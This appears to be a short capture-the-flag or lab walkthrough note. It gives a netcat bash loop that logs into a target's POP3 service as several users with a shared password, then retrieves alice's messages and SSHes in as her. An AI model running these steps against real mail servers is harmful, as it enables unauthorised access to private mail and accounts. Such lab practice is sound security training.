Continuing from [[Port 4555 - James]]

#### POP3.sh

---
```bash - kali
for user in alice bob carlos david earl frank; do

 (echo USER ${user}; sleep 2s; echo PASS abcd; sleep 2s; echo LIST; sleep 2s; echo quit) | nc -nvC $TARGET 110; done
```

```bash - kali
chmod +x pop3.sh
```

```bash - kali
./pop3.sh
```

---

If script above does not work, do manually:

We see alice has 2 messages.

```bash - kali
nc -nvC $TARGET 110
```

```bash - kali
USER alice
```

```bash - kali
PASS abcd
```

```bash - kali
RETR 1
```

```bash - kali
RETR 2
```

```bash - kali
ssh alice@$TARGET
```
